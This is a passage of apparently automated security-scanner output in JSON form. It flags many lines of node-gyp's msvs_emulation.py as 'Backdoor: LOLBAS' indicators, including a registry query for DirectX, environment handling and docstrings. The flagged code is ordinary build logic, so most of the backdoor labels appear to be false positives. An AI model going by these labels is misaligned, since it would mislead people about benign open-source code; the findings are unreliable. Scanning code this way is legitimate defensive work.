                      "text": "    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout = p.communicate()[0].decode(\"utf-8\")\n        for line in stdout.splitlines():\n",
                      "markdown": "`    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout = p.communicate()[0].decode(\"utf-8\")\n        for line in stdout.splitlines():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 9,
                  "endLine": 83,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\ndef _GenericRetrieve(root, default, path):\n    \"\"\"Given a list of dictionary keys |path| and a tree of dicts |root|, find\n    value at path, or return |default| if any of the path doesn't exist.\"\"\"\n    if not root:\n        return default\n    if not path:\n",
                    "rendered": {
                      "text": "\ndef _GenericRetrieve(root, default, path):\n    \"\"\"Given a list of dictionary keys |path| and a tree of dicts |root|, find\n    value at path, or return |default| if any of the path doesn't exist.\"\"\"\n    if not root:\n        return default\n    if not path:\n",
                      "markdown": "`\ndef _GenericRetrieve(root, default, path):\n    \"\"\"Given a list of dictionary keys |path| and a tree of dicts |root|, find\n    value at path, or return |default| if any of the path doesn't exist.\"\"\"\n    if not root:\n        return default\n    if not path:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1214,
                  "startColumn": 9,
                  "endLine": 1214,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        f.write(env_block)\n        f.close()\n\n        # Find cl.exe location for this architecture.\n        args = vs.SetupScript(arch)\n        args.extend(\n            (\"&&\", \"for\", \"%i\", \"in\", \"(cl.exe)\", \"do\", \"@echo\", \"LOC:%~$PATH:i\")\n",
                    "rendered": {
                      "text": "        f.write(env_block)\n        f.close()\n\n        # Find cl.exe location for this architecture.\n        args = vs.SetupScript(arch)\n        args.extend(\n            (\"&&\", \"for\", \"%i\", \"in\", \"(cl.exe)\", \"do\", \"@echo\", \"LOC:%~$PATH:i\")\n",
                      "markdown": "`        f.write(env_block)\n        f.close()\n\n        # Find cl.exe location for this architecture.\n        args = vs.SetupScript(arch)\n        args.extend(\n            (\"&&\", \"for\", \"%i\", \"in\", \"(cl.exe)\", \"do\", \"@echo\", \"LOC:%~$PATH:i\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1200,
                  "startColumn": 7,
                  "endLine": 1200,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        variables = popen.communicate()[0].decode(\"utf-8\")\n        if popen.returncode != 0:\n            raise Exception('\"%s\" failed with error %d' % (args, popen.returncode))\n        env = _ExtractImportantEnvironment(variables)\n\n        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n",
                    "rendered": {
                      "text": "        variables = popen.communicate()[0].decode(\"utf-8\")\n        if popen.returncode != 0:\n            raise Exception('\"%s\" failed with error %d' % (args, popen.returncode))\n        env = _ExtractImportantEnvironment(variables)\n\n        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n",
                      "markdown": "`        variables = popen.communicate()[0].decode(\"utf-8\")\n        if popen.returncode != 0:\n            raise Exception('\"%s\" failed with error %d' % (args, popen.returncode))\n        env = _ExtractImportantEnvironment(variables)\n\n        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1141,
                  "startColumn": 10,
                  "endLine": 1142,
                  "snippet": {
                    "text": "                'Environment variable \"%s\" '\n                \"required to be set to valid path\" % required\n            )\n    return env\n\n\ndef _FormatAsEnvironmentBlock(envvar_dict):\n    \"\"\"Format as an 'environment block' directly suitable for CreateProcess.\n",
                    "rendered": {
                      "text": "                'Environment variable \"%s\" '\n                \"required to be set to valid path\" % required\n            )\n    return env\n\n\ndef _FormatAsEnvironmentBlock(envvar_dict):\n    \"\"\"Format as an 'environment block' directly suitable for CreateProcess.\n",
                      "markdown": "`                'Environment variable \"%s\" '\n                \"required to be set to valid path\" % required\n            )\n    return env\n\n\ndef _FormatAsEnvironmentBlock(envvar_dict):\n    \"\"\"Format as an 'environment block' directly suitable for CreateProcess.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1118,
                  "startColumn": 3,
                  "endLine": 1118,
                  "endColumn": 8,
                  "snippet": {
                    "text": "        \"temp\",\n        \"tmp\",\n    )\n    env = {}\n    # This occasionally happens and leads to misleading SYSTEMROOT error messages\n    # if not caught here.\n    if output_of_set.count(\"=\") == 0:\n",
                    "rendered": {
                      "text": "        \"temp\",\n        \"tmp\",\n    )\n    env = {}\n    # This occasionally happens and leads to misleading SYSTEMROOT error messages\n    # if not caught here.\n    if output_of_set.count(\"=\") == 0:\n",
                      "markdown": "`        \"temp\",\n        \"tmp\",\n    )\n    env = {}\n    # This occasionally happens and leads to misleading SYSTEMROOT error messages\n    # if not caught here.\n    if output_of_set.count(\"=\") == 0:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 735,
                  "startColumn": 36,
                  "endLine": 735,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        ld(\"EntryPointSymbol\", prefix=\"/ENTRY:\")\n        ld(\"Profile\", map={\"true\": \"/PROFILE\"})\n        ld(\"LargeAddressAware\", map={\"1\": \":NO\", \"2\": \"\"}, prefix=\"/LARGEADDRESSAWARE\")\n        # TODO(scottmg): This should sort of be somewhere else (not really a flag).\n        ld(\"AdditionalDependencies\", prefix=\"\")\n\n        safeseh_default = \"true\" if self.GetArch(config) == \"x86\" else None\n",
                    "rendered": {
                      "text": "        ld(\"EntryPointSymbol\", prefix=\"/ENTRY:\")\n        ld(\"Profile\", map={\"true\": \"/PROFILE\"})\n        ld(\"LargeAddressAware\", map={\"1\": \":NO\", \"2\": \"\"}, prefix=\"/LARGEADDRESSAWARE\")\n        # TODO(scottmg): This should sort of be somewhere else (not really a flag).\n        ld(\"AdditionalDependencies\", prefix=\"\")\n\n        safeseh_default = \"true\" if self.GetArch(config) == \"x86\" else None\n",
                      "markdown": "`        ld(\"EntryPointSymbol\", prefix=\"/ENTRY:\")\n        ld(\"Profile\", map={\"true\": \"/PROFILE\"})\n        ld(\"LargeAddressAware\", map={\"1\": \":NO\", \"2\": \"\"}, prefix=\"/LARGEADDRESSAWARE\")\n        # TODO(scottmg): This should sort of be somewhere else (not really a flag).\n        ld(\"AdditionalDependencies\", prefix=\"\")\n\n        safeseh_default = \"true\" if self.GetArch(config) == \"x86\" else None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 461,
                  "startColumn": 51,
                  "endLine": 461,
                  "endColumn": 59,
                  "snippet": {
                    "text": "            return None\n\n    def GetNoImportLibrary(self, config):\n        \"\"\"If NoImportLibrary: true, ninja will not expect the output to include\n        an import library.\"\"\"\n        config = self._TargetConfig(config)\n        noimplib = self._Setting((\"NoImportLibrary\",), config)\n",
                    "rendered": {
                      "text": "            return None\n\n    def GetNoImportLibrary(self, config):\n        \"\"\"If NoImportLibrary: true, ninja will not expect the output to include\n        an import library.\"\"\"\n        config = self._TargetConfig(config)\n        noimplib = self._Setting((\"NoImportLibrary\",), config)\n",
                      "markdown": "`            return None\n\n    def GetNoImportLibrary(self, config):\n        \"\"\"If NoImportLibrary: true, ninja will not expect the output to include\n        an import library.\"\"\"\n        config = self._TargetConfig(config)\n        noimplib = self._Setting((\"NoImportLibrary\",), config)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 39,
                  "endLine": 385,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        return [self.ConvertVSMacros(p, config=config) for p in includes]\n\n    def AdjustMidlIncludeDirs(self, midl_include_dirs, config):\n        \"\"\"Updates midl_include_dirs to expand VS specific paths, and adds the\n        system include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = midl_include_dirs + self.msvs_system_include_dirs[config]\n",
                    "rendered": {
                      "text": "        return [self.ConvertVSMacros(p, config=config) for p in includes]\n\n    def AdjustMidlIncludeDirs(self, midl_include_dirs, config):\n        \"\"\"Updates midl_include_dirs to expand VS specific paths, and adds the\n        system include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = midl_include_dirs + self.msvs_system_include_dirs[config]\n",
                      "markdown": "`        return [self.ConvertVSMacros(p, config=config) for p in includes]\n\n    def AdjustMidlIncludeDirs(self, midl_include_dirs, config):\n        \"\"\"Updates midl_include_dirs to expand VS specific paths, and adds the\n        system include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = midl_include_dirs + self.msvs_system_include_dirs[config]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 373,
                  "startColumn": 34,
                  "endLine": 373,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        )\n\n    def AdjustIncludeDirs(self, include_dirs, config):\n        \"\"\"Updates include_dirs to expand VS specific paths, and adds the system\n        include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = include_dirs + self.msvs_system_include_dirs[config]\n",
                    "rendered": {
                      "text": "        )\n\n    def AdjustIncludeDirs(self, include_dirs, config):\n        \"\"\"Updates include_dirs to expand VS specific paths, and adds the system\n        include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = include_dirs + self.msvs_system_include_dirs[config]\n",
                      "markdown": "`        )\n\n    def AdjustIncludeDirs(self, include_dirs, config):\n        \"\"\"Updates include_dirs to expand VS specific paths, and adds the system\n        include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = include_dirs + self.msvs_system_include_dirs[config]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 7,
                  "endLine": 285,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n    def ConvertVSMacros(self, s, base_to_build=None, config=None):\n        \"\"\"Convert from VS macro names to something equivalent.\"\"\"\n        env = self.GetVSMacroEnv(base_to_build, config=config)\n        return ExpandMacros(s, env)\n\n    def AdjustLibraries(self, libraries):\n",
                    "rendered": {
                      "text": "\n    def ConvertVSMacros(self, s, base_to_build=None, config=None):\n        \"\"\"Convert from VS macro names to something equivalent.\"\"\"\n        env = self.GetVSMacroEnv(base_to_build, config=config)\n        return ExpandMacros(s, env)\n\n    def AdjustLibraries(self, libraries):\n",
                      "markdown": "`\n    def ConvertVSMacros(self, s, base_to_build=None, config=None):\n        \"\"\"Convert from VS macro names to something equivalent.\"\"\"\n        env = self.GetVSMacroEnv(base_to_build, config=config)\n        return ExpandMacros(s, env)\n\n    def AdjustLibraries(self, libraries):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 3,
                  "endLine": 182,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n",
                    "rendered": {
                      "text": "    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n",
                      "markdown": "`    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 5,
                  "endLine": 181,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n",
                    "rendered": {
                      "text": "        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n",
                      "markdown": "`        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 169,
                  "startColumn": 10,
                  "endLine": 170,
                  "snippet": {
                    "text": "    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\ndef ExtractSharedMSVSSystemIncludes(configs, generator_flags):\n    \"\"\"Finds msvs_system_include_dirs that are common to all targets, removes\n",
                    "rendered": {
                      "text": "    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\ndef ExtractSharedMSVSSystemIncludes(configs, generator_flags):\n    \"\"\"Finds msvs_system_include_dirs that are common to all targets, removes\n",
                      "markdown": "`    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\ndef ExtractSharedMSVSSystemIncludes(configs, generator_flags):\n    \"\"\"Finds msvs_system_include_dirs that are common to all targets, removes\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 166,
                  "startColumn": 12,
                  "endLine": 166,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    # want to leave the unexpanded variable in the path, so simply strip it.\n    dxsdk_dir = _FindDirectXInstallation()\n    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n",
                    "rendered": {
                      "text": "    # want to leave the unexpanded variable in the path, so simply strip it.\n    dxsdk_dir = _FindDirectXInstallation()\n    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n",
                      "markdown": "`    # want to leave the unexpanded variable in the path, so simply strip it.\n    dxsdk_dir = _FindDirectXInstallation()\n    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 3,
                  "endLine": 154,
                  "endColumn": 8,
                  "snippet": {
                    "text": "def GetGlobalVSMacroEnv(vs_version):\n    \"\"\"Get a dict of variables mapping internal VS macro names to their gyp\n    equivalents. Returns all variables that are independent of the target.\"\"\"\n    env = {}\n    # '$(VSInstallDir)' and '$(VCInstallDir)' are available when and only when\n    # Visual Studio is actually installed.\n    if vs_version.Path():\n",
                    "rendered": {
                      "text": "def GetGlobalVSMacroEnv(vs_version):\n    \"\"\"Get a dict of variables mapping internal VS macro names to their gyp\n    equivalents. Returns all variables that are independent of the target.\"\"\"\n    env = {}\n    # '$(VSInstallDir)' and '$(VCInstallDir)' are available when and only when\n    # Visual Studio is actually installed.\n    if vs_version.Path():\n",
                      "markdown": "`def GetGlobalVSMacroEnv(vs_version):\n    \"\"\"Get a dict of variables mapping internal VS macro names to their gyp\n    equivalents. Returns all variables that are independent of the target.\"\"\"\n    env = {}\n    # '$(VSInstallDir)' and '$(VCInstallDir)' are available when and only when\n    # Visual Studio is actually installed.\n    if vs_version.Path():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 68,
                  "endLine": 131,
                  "snippet": {
                    "text": "\ndef _FindDirectXInstallation():\n    \"\"\"Try to find an installation location for the DirectX SDK. Check for the\n    standard environment variable, and if that doesn't exist, try to find\n    via the registry. May return None if not found in either location.\"\"\"\n    # Return previously calculated value, if there is one\n    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n",
                    "rendered": {
                      "text": "\ndef _FindDirectXInstallation():\n    \"\"\"Try to find an installation location for the DirectX SDK. Check for the\n    standard environment variable, and if that doesn't exist, try to find\n    via the registry. May return None if not found in either location.\"\"\"\n    # Return previously calculated value, if there is one\n    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n",
                      "markdown": "`\ndef _FindDirectXInstallation():\n    \"\"\"Try to find an installation location for the DirectX SDK. Check for the\n    standard environment variable, and if that doesn't exist, try to find\n    via the registry. May return None if not found in either location.\"\"\"\n    # Return previously calculated value, if there is one\n    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 13,
                  "endLine": 129,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n\ndef _FindDirectXInstallation():\n    \"\"\"Try to find an installation location for the DirectX SDK. Check for the\n    standard environment variable, and if that doesn't exist, try to find\n    via the registry. May return None if not found in either location.\"\"\"\n    # Return previously calculated value, if there is one\n",
                    "rendered": {
                      "text": "\n\ndef _FindDirectXInstallation():\n    \"\"\"Try to find an installation location for the DirectX SDK. Check for the\n    standard environment variable, and if that doesn't exist, try to find\n    via the registry. May return None if not found in either location.\"\"\"\n    # Return previously calculated value, if there is one\n",
                      "markdown": "`\n\ndef _FindDirectXInstallation():\n    \"\"\"Try to find an installation location for the DirectX SDK. Check for the\n    standard environment variable, and if that doesn't exist, try to find\n    via the registry. May return None if not found in either location.\"\"\"\n    # Return previously calculated value, if there is one\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 73,
                  "endLine": 83,
                  "snippet": {
                    "text": "\n\ndef _GenericRetrieve(root, default, path):\n    \"\"\"Given a list of dictionary keys |path| and a tree of dicts |root|, find\n    value at path, or return |default| if any of the path doesn't exist.\"\"\"\n    if not root:\n        return default\n    if not path:\n",
                    "rendered": {
                      "text": "\n\ndef _GenericRetrieve(root, default, path):\n    \"\"\"Given a list of dictionary keys |path| and a tree of dicts |root|, find\n    value at path, or return |default| if any of the path doesn't exist.\"\"\"\n    if not root:\n        return default\n    if not path:\n",
                      "markdown": "`\n\ndef _GenericRetrieve(root, default, path):\n    \"\"\"Given a list of dictionary keys |path| and a tree of dicts |root|, find\n    value at path, or return |default| if any of the path doesn't exist.\"\"\"\n    if not root:\n        return default\n    if not path:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 31,
                  "endLine": 33,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    # works more or less because most programs (including the compiler, etc.)\n    # use that function to handle command line arguments.\n\n    # Use a heuristic to try to find args that are paths, and normalize them\n    if arg.find(\"/\") > 0 or arg.count(\"/\") > 1:\n        arg = os.path.normpath(arg)\n\n",
                    "rendered": {
                      "text": "    # works more or less because most programs (including the compiler, etc.)\n    # use that function to handle command line arguments.\n\n    # Use a heuristic to try to find args that are paths, and normalize them\n    if arg.find(\"/\") > 0 or arg.count(\"/\") > 1:\n        arg = os.path.normpath(arg)\n\n",
                      "markdown": "`    # works more or less because most programs (including the compiler, etc.)\n    # use that function to handle command line arguments.\n\n    # Use a heuristic to try to find args that are paths, and normalize them\n    if arg.find(\"/\") > 0 or arg.count(\"/\") > 1:\n        arg = os.path.normpath(arg)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 56,
